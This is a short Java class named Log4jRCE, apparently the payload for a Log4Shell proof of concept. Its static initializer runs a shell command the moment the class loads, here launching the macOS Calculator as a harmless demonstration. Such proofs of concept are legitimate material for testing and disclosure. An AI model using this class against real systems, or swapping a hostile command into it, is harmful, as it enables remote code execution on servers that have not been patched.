public class Log4jRCE {
    static {
        try {
            String[] cmd = {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
